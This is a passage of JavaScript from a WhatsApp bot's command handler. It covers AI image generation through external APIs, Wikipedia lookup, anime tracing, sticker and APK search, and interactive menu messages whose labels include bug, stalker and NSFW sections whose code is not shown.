          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygcalya(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcalya("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return replygcalya(`*Example:* ${prefix + command} blue sky`)
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygcalya("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: AlyaBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcalya("`GPT Not Responding`")
  }
}
break
case 'wikipedia': case 'wiki': {
	if (!text) return replygcalya(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygcalya('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcalya("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcalya("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygcalya("*Error: Could not track the anime or send the video.*");
  }
};
break
case 'stickersearch': {
if (!text) return replygcalya(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'apksearch': {
if (!text) return replygcalya(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    AlyaBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcalya(`Total Features of ${botname} is ${alyafeature()}`)
        break
                    case 'menu':
case 'help': case 'alyamenu': {
    let ownernya = ownernumber + '@s.whatsapp.net'
    let timestampe = speed()
    let latensie = speed() - timestampe
    let a = db.data.users[sender]
    let me = m.sender
    let alyamenu = `╔═━━━━✦❘ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 ]
    Hi, ${pushname}! 👋 ${alyatimewisher} ╔═━━━━✦❘ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 ]
    🕒 Runtime: ${runtime(process.uptime())}
    🤖 Bot: ${botname}
    📞 Owner No: +${ownernumber}
    🛠 Prefix: [ ${xprefix} ]
    🔒 Mode: ${AlyaBotInc.public ? 'Public' : `Self`}
    👤 Name: ${pushname}
    🕰 Time: ${xtime}
    📅 Date: ${xdate}
╚━━━━━━━━━━━━━━━━━━━━━╝
*Click MENU ❀ for options below*`

    // Using v12 menu style
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })),
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": 
`{"title":"MENU ❀",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"NSFW MENU",
"title":"click to display",
"description":"Displays The List Of NSFW Features",
"id":"${prefix}nsfwmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"},
{"header":"OWNER",
"title":"Owner 👤",
"description":"Contact the bot owner",
"id":"${prefix}owner"},
{"header":"SCRIPT",
"title":"Script 📃",
"description":"View the bot's script",
"id":"${prefix}script"}]
}]
}`
                            }
                        ]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'allmenu': {
    let alyamenu = `Hi ${pushname}\n\n${allmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'ownermenu': {
    let alyamenu = `Hi ${pushname}\n\n${ownermenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'othermenu': {
    let alyamenu = `Hi ${pushname}\n\n${othermenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'downloadmenu': {
    let alyamenu = `Hi ${pushname}\n\n${downloadmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'groupmenu': {
    let alyamenu = `Hi ${pushname}\n\n${groupmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'gamemenu': {
    let alyamenu = `Hi ${pushname}\n\n${gamemenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'funmenu': {
    let alyamenu = `Hi ${pushname}\n\n${funmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'stalkermenu': {
    let alyamenu = `Hi ${pushname}\n\n${stalkermenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'randomphotomenu': {
    let alyamenu = `Hi ${pushname}\n\n${randomphotomenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
